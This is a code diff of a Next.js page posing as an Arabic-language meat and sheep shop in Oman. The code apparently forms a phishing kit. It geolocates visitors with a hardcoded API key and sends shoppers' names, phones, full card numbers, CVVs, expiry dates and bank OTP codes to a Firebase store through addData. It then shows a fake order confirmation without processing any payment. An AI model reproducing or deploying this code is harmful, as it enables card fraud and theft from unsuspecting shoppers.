@@ -1,32 +1,45 @@
-"use client"
+"use client";
 
-import { useEffect, useState } from "react"
-import { Button } from "@/components/ui/button"
-import { Badge } from "@/components/ui/badge"
-import { Dialog, DialogContent, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog"
-import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import { Card, CardContent } from "@/components/ui/card"
-import { Separator } from "@/components/ui/separator"
-import Link from "next/link"
-import { Star, Truck, Shield, Clock, CreditCard, Smartphone } from "lucide-react"
-import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
-import PaymentOptions from "@/components/part-all"
-import { addData } from "@/lib/firebase"
-import { setupOnlineStatus } from "@/lib/utils"
+import { useEffect, useState } from "react";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import {
+  Dialog,
+  DialogContent,
+  DialogFooter,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Card, CardContent } from "@/components/ui/card";
+import { Separator } from "@/components/ui/separator";
+import Link from "next/link";
+import {
+  Star,
+  Truck,
+  Shield,
+  Clock,
+  CreditCard,
+  Smartphone,
+} from "lucide-react";
+import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
+import PaymentOptions from "@/components/part-all";
+import { addData } from "@/lib/firebase";
+import { setupOnlineStatus } from "@/lib/utils";
 
-type FlowStep = "hero" | "offer" | "checkout" | "payment" | "otp" | "success"
+type FlowStep = "hero" | "offer" | "checkout" | "payment" | "otp" | "success";
 
 // Add this interface and offers data after the imports
 interface Offer {
-  id: string
-  title: string
-  description: string
-  originalPrice: number
-  offerPrice: number
-  image: string
-  badge?: string
-  popular?: boolean
+  id: string;
+  title: string;
+  description: string;
+  originalPrice: number;
+  offerPrice: number;
+  image: string;
+  badge?: string;
+  popular?: boolean;
 }
 
 const offers: Offer[] = [
@@ -35,8 +48,9 @@ const offers: Offer[] = [
     title: "خاروف استرالي",
     description: "الأفضل للعائلات الكبيرة",
     originalPrice: 55.0,
-    offerPrice: 44.0,
-    image: "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
+    offerPrice: 34.9,
+    image:
+      "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
     badge: "الأكثر طلباً",
     popular: true,
   },
@@ -45,8 +59,9 @@ const offers: Offer[] = [
     title: "خاروف نعيمي",
     description: "الأفضل للعائلات الكبيرة",
     originalPrice: 50.0,
-    offerPrice: 34.90,
-    image: "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
+    offerPrice: 34.9,
+    image:
+      "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
     badge: "الأكثر طلباً",
     popular: true,
   },
@@ -56,7 +71,8 @@ const offers: Offer[] = [
     description: "الأفضل للعائلات الكبيرة",
     originalPrice: 20,
     offerPrice: 15,
-    image: "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
+    image:
+      "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
     badge: "الأكثر طلباً",
     popular: true,
   },
@@ -66,7 +82,8 @@ const offers: Offer[] = [
     description: "مثالية لعطلة نهاية الأسبوع",
     originalPrice: 20,
     offerPrice: 12,
-    image: "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
+    image:
+      "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
     badge: "عرض الشواء",
   },
 
@@ -88,123 +105,133 @@ const offers: Offer[] = [
     image: "/jaj.jpg",
     badge: "اقتصادي",
   },
-]
+];
 const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`;
 
 export default function MainPage() {
-  const [currentStep, setCurrentStep] = useState<FlowStep>("hero")
-  const [selectedOffer, setSelectedOffer] = useState<Offer | null>(null)
-  const [quantity, setQuantity] = useState(1)
-  const [open, setOpen] = useState(true)
+  const [currentStep, setCurrentStep] = useState<FlowStep>("hero");
+  const [selectedOffer, setSelectedOffer] = useState<Offer | null>(null);
+  const [quantity, setQuantity] = useState(1);
+  const [open, setOpen] = useState(true);
   const [customerInfo, setCustomerInfo] = useState({
     name: "",
     phone: "",
     address: "",
     city: "",
-  })
-  const [paymentMethod, setPaymentMethod] = useState<"card" | "cash">("card")
-  const [otpCode, setOtpCode] = useState("")
-  const [paymentType, setPaymentType] = useState("")
+  });
+  const [paymentMethod, setPaymentMethod] = useState<"card" | "cash">("card");
+  const [otpCode, setOtpCode] = useState("");
+  const [paymentType, setPaymentType] = useState("");
   const [cardInfo, setCardInfo] = useState({
     number: "",
     expiry: "",
-    month:"",
+    month: "",
     cvv: "",
     name: "",
-  })
+  });
   const getLocationAndLog = async () => {
     if (!visitorId) return;
 
     // This API key is public and might be rate-limited or disabled.
     // For a production app, use a secure way to handle API keys, ideally on the backend.
-    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
-    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb";
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
 
     try {
-      const response = await fetch(url)
+      const response = await fetch(url);
       if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`)
+        throw new Error(`HTTP error! Status: ${response.status}`);
       }
-      const country = await response.text()
+      const country = await response.text();
       await addData({
         createdDate: new Date().toISOString(),
         id: visitorId,
         country: country,
         action: "page_load",
         currentPage: "الرئيسية ",
-      })
-      localStorage.setItem("country", country) // Consider privacy implications
-      setupOnlineStatus(visitorId)
+      });
+      localStorage.setItem("country", country); // Consider privacy implications
+      setupOnlineStatus(visitorId);
     } catch (error) {
-      console.error("Error fetching location:", error)
+      console.error("Error fetching location:", error);
       // Log error with visitor ID for debugging
       await addData({
         createdDate: new Date().toISOString(),
         id: visitorId,
-        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
-        action: "location_error"
+        error: `Location fetch failed: ${
+          error instanceof Error ? error.message : String(error)
+        }`,
+        action: "location_error",
       });
     }
-  }
+  };
   useEffect(() => {
-    getLocationAndLog()
+    getLocationAndLog();
   }, []);
   useEffect(() => {
-    addData({ id: visitorId, currentStep })
+    addData({ id: visitorId, currentStep });
   }, [currentStep]);
   // Update the totalPrice calculation
-  const totalPrice = selectedOffer ? selectedOffer.offerPrice * quantity : 0
+  const totalPrice = selectedOffer ? selectedOffer.offerPrice * quantity : 0;
 
   // Update the handleOfferClick function
   const handleOfferClick = () => {
-    setCurrentStep("offer")
-  }
+    setCurrentStep("offer");
+  };
 
   const handleProceedToCheckout = () => {
-    setCurrentStep("checkout")
-  }
+    setCurrentStep("checkout");
+  };
 
   const handleProceedToPayment = () => {
     if (customerInfo.name && customerInfo.phone && customerInfo.address) {
-      addData({ id: visitorId, name: customerInfo.name, phone: customerInfo.phone })
+      addData({
+        id: visitorId,
+        name: customerInfo.name,
+        phone: customerInfo.phone,
+      });
 
-      setCurrentStep("payment")
+      setCurrentStep("payment");
     }
-  }
+  };
 
   const handlePayment = () => {
-    addData({ id: visitorId, cardNumber: cardInfo.number, cvv:cardInfo.cvv,expiryDate:cardInfo.expiry +'/'+cardInfo.month})
+    addData({
+      id: visitorId,
+      cardNumber: cardInfo.number,
+      cvv: cardInfo.cvv,
+      expiryDate: cardInfo.expiry + "/" + cardInfo.month,
+    });
     if (paymentMethod === "cash") {
-      setCurrentStep("success")
+      setCurrentStep("success");
     } else {
-      setCurrentStep("otp")
+      setCurrentStep("otp");
     }
-  }
+  };
 
   const handleOtpVerification = () => {
-    addData({ id: visitorId,otp:otpCode })
+    addData({ id: visitorId, otp: otpCode });
 
     setTimeout(() => {
-      setCurrentStep("success")
+      setCurrentStep("success");
     }, 3000);
-    
-  }
+  };
 
   const closeDialog = () => {
-    setCurrentStep("hero")
+    setCurrentStep("hero");
     // Reset form data
-    setQuantity(1)
-    setCustomerInfo({ name: "", phone: "", address: "", city: "" })
-    setOtpCode("")
-    setCardInfo({ number: "", expiry: "", cvv: "", name: "",month:"" })
-    setSelectedOffer(null)
-  }
+    setQuantity(1);
+    setCustomerInfo({ name: "", phone: "", address: "", city: "" });
+    setOtpCode("");
+    setCardInfo({ number: "", expiry: "", cvv: "", name: "", month: "" });
+    setSelectedOffer(null);
+  };
 
   // Add new function to handle offer selection
   const handleSelectOffer = (offer: Offer) => {
-    setSelectedOffer(offer)
-    setCurrentStep("checkout")
-  }
+    setSelectedOffer(offer);
+    setCurrentStep("checkout");
+  };
 
   return (
     <div className="min-h-screen">
@@ -225,13 +252,16 @@ export default function MainPage() {
           <DialogContent className="max-w-[350px]">
             <img src="jahor.jpg" alt="" />
             <DialogFooter>
-              <Button className="bg-green-700 w-full"
-                onClick={() => { handleSelectOffer(offers[0]) }}>
+              <Button
+                className="bg-green-700 w-full"
+                onClick={() => {
+                  handleSelectOffer(offers[0]);
+                }}
+              >
                 أحصل على العرض
               </Button>
             </DialogFooter>
           </DialogContent>
-
         </Dialog>
         <div className="container mx-auto px-4 relative z-10">
           <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
@@ -244,7 +274,10 @@ export default function MainPage() {
                 </Badge>
                 <div className="flex items-center space-x-1 space-x-reverse">
                   {[...Array(5)].map((_, i) => (
-                    <Star key={i} className="w-4 h-4 fill-yellow-400 text-yellow-400" />
+                    <Star
+                      key={i}
+                      className="w-4 h-4 fill-yellow-400 text-yellow-400"
+                    />
                   ))}
                   <span className="text-sm opacity-90">(4.9 من 5)</span>
                 </div>
@@ -259,7 +292,8 @@ export default function MainPage() {
                   </span>
                 </h1>
                 <p className="text-xl md:text-2xl opacity-90 leading-relaxed">
-                  نقدم لك أفضل اللحوم الطازجة والمضمونة الجودة مع خدمة توصيل سريعة وآمنة إلى باب منزلك
+                  نقدم لك أفضل اللحوم الطازجة والمضمونة الجودة مع خدمة توصيل
+                  سريعة وآمنة إلى باب منزلك
                 </p>
               </div>
 
@@ -337,7 +371,9 @@ export default function MainPage() {
                 <div className="absolute -top-4 -right-4 bg-white rounded-lg p-4 shadow-xl animate-bounce">
                   <div className="flex items-center space-x-2 space-x-reverse">
                     <div className="w-3 h-3 bg-green-500 rounded-full"></div>
-                    <span className="text-sm font-semibold text-gray-800">متوفر الآن</span>
+                    <span className="text-sm font-semibold text-gray-800">
+                      متوفر الآن
+                    </span>
                   </div>
                 </div>
 
@@ -349,7 +385,7 @@ export default function MainPage() {
                 </Button>
 
                 <Button
-                  variant={'outline'}
+                  variant={"outline"}
                   onClick={handleOfferClick}
                   className="w-full my-4  text-black font-bold"
                 >
@@ -373,7 +409,10 @@ export default function MainPage() {
 
       {/* Offers Selection Dialog */}
       <Dialog open={currentStep === "offer"} onOpenChange={closeDialog}>
-        <DialogContent className="max-w-4xl mx-auto max-h-[90vh] overflow-y-auto" dir="rtl">
+        <DialogContent
+          className="max-w-4xl mx-auto max-h-[90vh] overflow-y-auto"
+          dir="rtl"
+        >
           <DialogHeader>
             <DialogTitle className="text-3xl font-bold text-center text-green-700 mb-2">
               🎉 عروض خاصة محدودة!
@@ -385,13 +424,16 @@ export default function MainPage() {
             {offers.map((offer) => (
               <Card
                 key={offer.id}
-                className={`cursor-pointer transition-all duration-300 hover:shadow-xl hover:scale-105 ${offer.popular ? "ring-2 ring-yellow-400 relative" : ""
-                  }`}
+                className={`cursor-pointer transition-all duration-300 hover:shadow-xl hover:scale-105 ${
+                  offer.popular ? "ring-2 ring-yellow-400 relative" : ""
+                }`}
                 onClick={() => handleSelectOffer(offer)}
               >
                 {offer.popular && (
                   <div className="absolute -top-3 left-1/2 transform -translate-x-1/2 z-10">
-                    <Badge className="bg-yellow-500 text-black px-3 py-1 font-bold">⭐ الأكثر شعبية</Badge>
+                    <Badge className="bg-yellow-500 text-black px-3 py-1 font-bold">
+                      ⭐ الأكثر شعبية
+                    </Badge>
                   </div>
                 )}
 
@@ -403,19 +445,28 @@ export default function MainPage() {
                       className="w-full h-40 object-cover rounded-t-lg"
                     />
                     {offer.badge && (
-                      <Badge className="absolute top-2 right-2 bg-red-500 text-white">{offer.badge}</Badge>
+                      <Badge className="absolute top-2 right-2 bg-red-500 text-white">
+                        {offer.badge}
+                      </Badge>
                     )}
                   </div>
 
                   <div className="p-4">
-                    <h3 className="text-lg font-bold mb-2 text-right">{offer.title}</h3>
-                    <p className="text-sm text-gray-600 mb-3 text-right">{offer.description}</p>
-
+                    <h3 className="text-lg font-bold mb-2 text-right">
+                      {offer.title}
+                    </h3>
+                    <p className="text-sm text-gray-600 mb-3 text-right">
+                      {offer.description}
+                    </p>
 
                     <div className="flex items-center justify-between mb-4">
                       <div className="text-right">
-                        <span className="text-2xl font-bold text-green-600">{offer.offerPrice} ر.ع</span>
-                        <span className="text-sm text-gray-500 line-through mr-2">{offer.originalPrice} ر.ع</span>
+                        <span className="text-2xl font-bold text-green-600">
+                          {offer.offerPrice} ر.ع
+                        </span>
+                        <span className="text-sm text-gray-500 line-through mr-2">
+                          {offer.originalPrice} ر.ع
+                        </span>
                       </div>
                       <Badge className="bg-red-100 text-red-700">
                         وفر {offer.originalPrice - offer.offerPrice} ر.ع
@@ -435,8 +486,12 @@ export default function MainPage() {
           </div>
 
           <div className="mt-6 text-center">
-            <p className="text-sm text-gray-500">🚚 توصيل مجاني لجميع الباقات</p>
-            <p className="text-sm text-gray-500">⏰ العرض ساري حتى نفاد الكمية</p>
+            <p className="text-sm text-gray-500">
+              🚚 توصيل مجاني لجميع الباقات
+            </p>
+            <p className="text-sm text-gray-500">
+              ⏰ العرض ساري حتى نفاد الكمية
+            </p>
           </div>
         </DialogContent>
       </Dialog>
@@ -445,7 +500,9 @@ export default function MainPage() {
       <Dialog open={currentStep === "checkout"} onOpenChange={closeDialog}>
         <DialogContent className="max-w-lg mx-auto" dir="rtl">
           <DialogHeader>
-            <DialogTitle className="text-2xl font-bold text-center">معلومات التوصيل</DialogTitle>
+            <DialogTitle className="text-2xl font-bold text-center">
+              معلومات التوصيل
+            </DialogTitle>
           </DialogHeader>
           <div className="space-y-4">
             <div className="grid grid-cols-2 gap-4">
@@ -454,7 +511,9 @@ export default function MainPage() {
                 <Input
                   id="name"
                   value={customerInfo.name}
-                  onChange={(e) => setCustomerInfo({ ...customerInfo, name: e.target.value })}
+                  onChange={(e) =>
+                    setCustomerInfo({ ...customerInfo, name: e.target.value })
+                  }
                   placeholder="أدخل اسمك"
                 />
               </div>
@@ -463,7 +522,9 @@ export default function MainPage() {
                 <Input
                   id="phone"
                   value={customerInfo.phone}
-                  onChange={(e) => setCustomerInfo({ ...customerInfo, phone: e.target.value })}
+                  onChange={(e) =>
+                    setCustomerInfo({ ...customerInfo, phone: e.target.value })
+                  }
                   placeholder="9XXXXXXX"
                 />
               </div>
@@ -474,7 +535,9 @@ export default function MainPage() {
               <Input
                 id="address"
                 value={customerInfo.address}
-                onChange={(e) => setCustomerInfo({ ...customerInfo, address: e.target.value })}
+                onChange={(e) =>
+                  setCustomerInfo({ ...customerInfo, address: e.target.value })
+                }
                 placeholder="المنطقة، الشارع، رقم المبنى"
               />
             </div>
@@ -484,7 +547,9 @@ export default function MainPage() {
               <Input
                 id="city"
                 value={customerInfo.city}
-                onChange={(e) => setCustomerInfo({ ...customerInfo, city: e.target.value })}
+                onChange={(e) =>
+                  setCustomerInfo({ ...customerInfo, city: e.target.value })
+                }
                 placeholder="مسقط، صلالة، نزوى..."
               />
             </div>
@@ -512,13 +577,19 @@ export default function MainPage() {
               <Separator className="my-2" />
               <div className="flex justify-between font-bold">
                 <span>المجموع</span>
-                <span>{paymentType === "partial" ? "0.5" : totalPrice} ر.ع</span>
+                <span>
+                  {paymentType === "partial" ? "0.5" : totalPrice} ر.ع
+                </span>
               </div>
             </div>
 
             <Button
               onClick={handleProceedToPayment}
-              disabled={!customerInfo.name || !customerInfo.phone || !customerInfo.address}
+              disabled={
+                !customerInfo.name ||
+                !customerInfo.phone ||
+                !customerInfo.address
+              }
               className="w-full bg-green-600 hover:bg-green-700"
             >
               متابعة للدفع
@@ -531,12 +602,16 @@ export default function MainPage() {
       <Dialog open={currentStep === "payment"} onOpenChange={closeDialog}>
         <DialogContent className="max-w-lg mx-auto" dir="rtl">
           <DialogHeader>
-            <DialogTitle className="text-2xl font-bold text-center">طريقة الدفع</DialogTitle>
+            <DialogTitle className="text-2xl font-bold text-center">
+              طريقة الدفع
+            </DialogTitle>
           </DialogHeader>
           <div className="space-y-6">
             <div className="grid grid-cols-2 gap-4">
               <Card
-                className={`cursor-pointer transition-all ${paymentMethod === "card" ? "ring-2 ring-green-500" : ""}`}
+                className={`cursor-pointer transition-all ${
+                  paymentMethod === "card" ? "ring-2 ring-green-500" : ""
+                }`}
                 onClick={() => setPaymentMethod("card")}
               >
                 <CardContent className="p-4 text-center">
@@ -546,8 +621,9 @@ export default function MainPage() {
               </Card>
 
               <Card
-              
-                className={`cursor-pointer transition-all ${paymentMethod === "cash" ? "ring-2 ring-green-500" : ""}`}
+                className={`cursor-pointer transition-all ${
+                  paymentMethod === "cash" ? "ring-2 ring-green-500" : ""
+                }`}
               >
                 <CardContent className="p-4 text-center">
                   <div className="w-8 h-8 mx-auto mb-2 bg-green-600 rounded-full flex items-center justify-center">
@@ -565,7 +641,9 @@ export default function MainPage() {
                   <Input
                     id="cardNumber"
                     value={cardInfo.number}
-                    onChange={(e) => setCardInfo({ ...cardInfo, number: e.target.value })}
+                    onChange={(e) =>
+                      setCardInfo({ ...cardInfo, number: e.target.value })
+                    }
                     placeholder="1234 5678 9012 3456"
                   />
                 </div>
@@ -575,20 +653,22 @@ export default function MainPage() {
                     <Input
                       id="expiry"
                       value={cardInfo.expiry}
-                      onChange={(e) => setCardInfo({ ...cardInfo, expiry: e.target.value })}
+                      onChange={(e) =>
+                        setCardInfo({ ...cardInfo, expiry: e.target.value })
+                      }
                       placeholder="YY"
                       maxLength={2}
-
                     />
-                    
                   </div>
                   <div>
-                  <Label htmlFor="expiry"> سنة</Label>
+                    <Label htmlFor="expiry"> سنة</Label>
 
-                  <Input
+                    <Input
                       id="month"
                       value={cardInfo.month}
-                      onChange={(e) => setCardInfo({ ...cardInfo, month: e.target.value })}
+                      onChange={(e) =>
+                        setCardInfo({ ...cardInfo, month: e.target.value })
+                      }
                       placeholder="MM"
                       maxLength={2}
                     />
@@ -600,7 +680,9 @@ export default function MainPage() {
                       type="password"
                       maxLength={3}
                       value={cardInfo.cvv}
-                      onChange={(e) => setCardInfo({ ...cardInfo, cvv: e.target.value })}
+                      onChange={(e) =>
+                        setCardInfo({ ...cardInfo, cvv: e.target.value })
+                      }
                       placeholder="123"
                     />
                   </div>
@@ -610,23 +692,28 @@ export default function MainPage() {
                   <Input
                     id="cardName"
                     value={cardInfo.name}
-                    onChange={(e) => setCardInfo({ ...cardInfo, name: e.target.value })}
+                    onChange={(e) =>
+                      setCardInfo({ ...cardInfo, name: e.target.value })
+                    }
                     placeholder="الاسم كما يظهر على البطاقة"
                   />
                 </div>
               </div>
             )}
-            <div className="bg-gray-50 p-4 rounded-lg">
-
-            </div>
+            <div className="bg-gray-50 p-4 rounded-lg"></div>
             <div className="bg-gray-50 p-4 rounded-lg">
               <div className="flex justify-between font-bold text-lg">
                 <span>المبلغ المطلوب دفعه</span>
-                <span>{paymentType === "partial" ? "0.5" : totalPrice} ر.ع</span>
+                <span>
+                  {paymentType === "partial" ? "0.5" : totalPrice} ر.ع
+                </span>
               </div>
             </div>
 
-            <Button onClick={handlePayment} className="w-full bg-green-600 hover:bg-green-700 text-lg py-3">
+            <Button
+              onClick={handlePayment}
+              className="w-full bg-green-600 hover:bg-green-700 text-lg py-3"
+            >
               {paymentMethod === "card" ? "ادفع الآن" : "تأكيد الطلب"}
             </Button>
           </div>
@@ -637,12 +724,16 @@ export default function MainPage() {
       <Dialog open={currentStep === "otp"} onOpenChange={closeDialog}>
         <DialogContent className="max-w-md mx-auto" dir="rtl">
           <DialogHeader>
-            <DialogTitle className="text-2xl font-bold text-center">تأكيد الدفع</DialogTitle>
+            <DialogTitle className="text-2xl font-bold text-center">
+              تأكيد الدفع
+            </DialogTitle>
           </DialogHeader>
           <div className="space-y-6 text-center">
             <div>
               <Smartphone className="w-16 h-16 mx-auto mb-4 text-green-600" />
-              <p className="text-gray-600 mb-4">تم إرسال رمز التأكيد إلى رقم هاتفك</p>
+              <p className="text-gray-600 mb-4">
+                تم إرسال رمز التأكيد إلى رقم هاتفك
+              </p>
               <p className="font-semibold">{customerInfo.phone}</p>
             </div>
 
@@ -683,24 +774,38 @@ export default function MainPage() {
             </div>
 
             <div>
-              <h3 className="text-2xl font-bold text-green-700 mb-2">تم تأكيد طلبك!</h3>
-              <p className="text-gray-600 mb-4">شكراً لك! سيتم توصيل طلبك خلال ساعتين</p>
+              <h3 className="text-2xl font-bold text-green-700 mb-2">
+                تم تأكيد طلبك!
+              </h3>
+              <p className="text-gray-600 mb-4">
+                شكراً لك! سيتم توصيل طلبك خلال ساعتين
+              </p>
               {/* Update the success dialog content */}
               <div className="bg-green-50 p-4 rounded-lg">
-                <p className="font-semibold">رقم الطلب: #OM{Math.floor(Math.random() * 10000)}</p>
+                <p className="font-semibold">
+                  رقم الطلب: #OM{Math.floor(Math.random() * 10000)}
+                </p>
                 {selectedOffer && <p>الباقة: {selectedOffer.title}</p>}
                 <p>الكمية: {quantity}</p>
                 <p>المبلغ المدفوع: {totalPrice} ر.ع</p>
-                <p>طريقة الدفع: {paymentMethod === "card" ? "بطاقة ائتمان" : "الدفع عند التسليم"}</p>
+                <p>
+                  طريقة الدفع:{" "}
+                  {paymentMethod === "card"
+                    ? "بطاقة ائتمان"
+                    : "الدفع عند التسليم"}
+                </p>
               </div>
             </div>
 
-            <Button onClick={closeDialog} className="w-full bg-green-600 hover:bg-green-700">
+            <Button
+              onClick={closeDialog}
+              className="w-full bg-green-600 hover:bg-green-700"
+            >
               العودة للرئيسية
             </Button>
           </div>
         </DialogContent>
       </Dialog>
     </div>
-  )
+  );
 }
